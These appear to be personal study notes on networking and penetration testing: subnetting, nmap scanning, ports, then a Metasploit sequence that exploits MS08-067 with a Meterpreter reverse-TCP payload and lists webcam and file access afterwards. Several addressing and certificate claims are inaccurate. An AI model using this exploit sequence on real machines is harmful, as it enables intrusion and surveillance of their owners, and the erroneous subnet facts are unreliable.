10.87.2.0/24
network | | | 
CYBER = classless interdomain routing
gives 
1. network
2. broadcast 
	last address (10.87.2.255)
	used for ping - sent to all clients on network
	can hide addresses - if no outward traffic, can't find which
3. clients
4. gateway
	assumed to be either 1 or 254; can be random

1-255 are usable

10.87.2.0/25 - completely seperate network
different subnet
	broadcast - 10.87.2.127
can't know how many times split, but can find where it ends

10.87.2.128/25 - broadcast is on 256, distinct from network above

^
| this can all be googled

24 = matching bits in ip address

same network:
	only need switch

two seperate networks:
	need a router
	
network scanners:
	nmap
	ping (nmap -sP 10.87.2.0/24)
	can find os version, details
	tcp != udp
	ports - http, https, ftp (control 21, data 20), dns, ntp, dhcp, ssh 22
	honeypots fool scanners (imitate OS)
	in competitions, custom services (unique, non-standard)

SIP - session initiation protocol
H.225.0 - different version of SIP
RTP - real time protocol (audio data)
g711U - voice encoding

rhost - remote host
rport - remote port

ms08-067 - xp vulnerability 
	rport is 445 (part of exploit)
nt - windows before '95

use reverse https:
	encrypted
	hides your traffic

msfconsole	// at any time, # show options
	search ms08-067 // has a giant database with all exploits
	use exploit/path/to/ms08-067	// just a script
	set RHOST <ip addr>
	set payload windows/meterpreter/reverse_tcp // gives fun ways of remoting to peoples machines
	set lhost <your ip>
	exploit - after this you can do basically anything
		file browser
		webcam
		format - 'post exploitation module'
	'will get detected by every av ever'

golden ticket - very hard to revoke
	some orgs just kill all accounts and rebuild
	
domain controllers issue 'self-signing certificates'
	no expiry - ensures control is never split
